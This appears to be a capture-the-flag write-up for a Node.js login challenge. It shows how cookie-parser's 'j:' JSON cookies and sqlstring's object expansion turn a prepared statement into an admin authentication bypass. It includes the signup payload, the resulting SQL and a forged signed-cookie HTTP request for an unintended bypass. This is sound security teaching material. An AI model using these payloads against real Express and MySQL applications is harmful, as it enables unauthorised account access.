Login Page
===

A small node.js application containing only user creation and login pages.
The flag is displayed only for the administrator (user with id 1).
```js
    result = await db.awaitQuery("SELECT `id` FROM `users` WHERE `login` = ? AND `password` = ? LIMIT 1", [req.signedCookies.login, req.signedCookies.password])
    if (result.length === 1) {
        if(result[0].id === 1) {
            message = "Welcome admin. Your flag " + flag
```

After registration, the user's login and password is stored in a signed cookies.
```js
app.post('/signup', [ validator.body('login').isString().isLength({ max: 64 }).trim(), validator.body('password').isString().isLength({ max: 64 }) ], async (req, res) => {
  const db = await pool.awaitGetConnection()
  try {
    validator.validationResult(req).throw()
    result = await db.awaitQuery("SELECT `id` FROM `users` WHERE `login` = ?", [req.body.login])
    if (result.length != 0) 
      return res.render('signup', {error: 'User already exists'})
    result = await db.awaitQuery("INSERT INTO `users` (`login`, `password`) VALUES (?, ?)", [req.body.login, req.body.password])
    res.cookie('login', req.body.login, { signed: true })
    res.cookie('password', req.body.password, { signed: true })
```

The cookie parser supports writing objects to cookie values via the `j:{"json":"object"}` notation. At the same time, due to the incorrect parsing order, the string written to the signed cookie can be parsed as an object.

https://github.com/expressjs/cookie-parser/blob/e5862bdb0c1130450a5b50bc07719becf0ab8c81/index.js#L62-L65
```js
    // parse signed cookies
    if (secrets.length !== 0) {
      req.signedCookies = signedCookies(req.cookies, secrets)
      req.signedCookies = JSONCookies(req.signedCookies)
```

The mysql-await library used in the task uses [sqlstring](xxx), which handles non-string parameters in queries in a very specific way by default.

https://github.com/mysqljs/sqlstring/blob/cd528556b4b6bcf300c3db515026935dedf7cfa1/lib/SqlString.js#L170-L184
```js
SqlString.objectToValues = function objectToValues(object, timeZone) {
  var sql = '';
  for (var key in object) {
    var val = object[key];
    if (typeof val === 'function') {
      continue;
    }
    sql += (sql.length === 0 ? '' : ', ') + SqlString.escapeId(key) + ' = ' + SqlString.escape(val, true, timeZone);
  }
  return sql;
};
```

```js
id = {"x":"y"}
sqlstring.format('select 1 from dual where id = ?', [id])
// select 1 from dual where id = `x` = 'y'
```

Thus, if objects are used in a prepared statement, this can change the selection conditions and, as a result, lead to authorization bypass.

**Solution**

Create user 
```
login=j:{"id":"1"}&password=j:{"id":"1"}
```
The following SQL query is generated during authorization
```sql
SELECT `id` FROM `users` WHERE `login` = `id` = '1' AND `password` = `id` = '1' LIMIT 1
```
Which returns the admin ID as a result.

Unfortunately, due to incorrect validation of signed cookies, there was a very simple unintended solution in the first version. In case the cookie signature of the value is invalid, but the entry format was correct `s:<value>.<signature>`. Values in `signedCookies` returns `false` instead of `undefined`, which, as a result, also changes the selection conditions and allows you to log in as an administrator.
```http
GET / HTTP/1.1
Host: login.volgactf-task.ru
Cookie: login=s:anything.anything; password=s:anything.anything;
```
```
SELECT `id` FROM `users` WHERE `login` = FALSE AND `password` = FALSE LIMIT 1
```